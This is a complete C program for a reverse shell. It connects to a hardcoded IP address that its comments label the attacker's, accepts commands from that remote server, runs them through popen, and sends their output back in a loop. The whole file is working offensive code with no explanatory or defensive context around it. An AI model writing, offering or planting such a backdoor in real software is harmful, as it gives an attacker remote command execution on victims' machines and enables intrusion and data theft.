#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define PORT 8000
#define BUFFER_SIZE 1024

int main() {
    int sock;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];

    // Create a TCP socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("[!] Socket creation failed");
        return 1;
    }

    // Configure server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT); // Attacker port
    server_addr.sin_addr.s_addr = inet_addr("192.168.168.13"); // Replace with attacker IP

    // Connect to the server
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("[!] Connection failed");
        close(sock);
        return 1;
    }

    printf("[+] Connected to server\n");

    while (1) {
        memset(buffer, 0, sizeof(buffer)); // Clear buffer

        // Receive command from server
        int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytes_received <= 0) {
            perror("[!] Connection closed or error");
            break;
        }

        buffer[bytes_received] = '\0'; // Null-terminate received data
        buffer[strcspn(buffer, "\n")] = 0; // Remove trailing newline

        // Check for exit condition
        if (strcmp(buffer, "exit") == 0 || strcmp(buffer, "quit") == 0) {
            printf("[*] Exit command received\n");
            break;
        }

        // Execute command
        FILE *fp = popen(buffer, "r");
        if (fp == NULL) {
            char *err_msg = "Failed to run command\n";
            send(sock, err_msg, strlen(err_msg), 0);
            continue;
        }

        // Send command output back to server
        while (fgets(buffer, sizeof(buffer), fp) != NULL) {
            send(sock, buffer, strlen(buffer), 0);
        }

        pclose(fp);
    }

    // Close socket
    close(sock);
    printf("[*] Connection closed\n");

    return 0;
}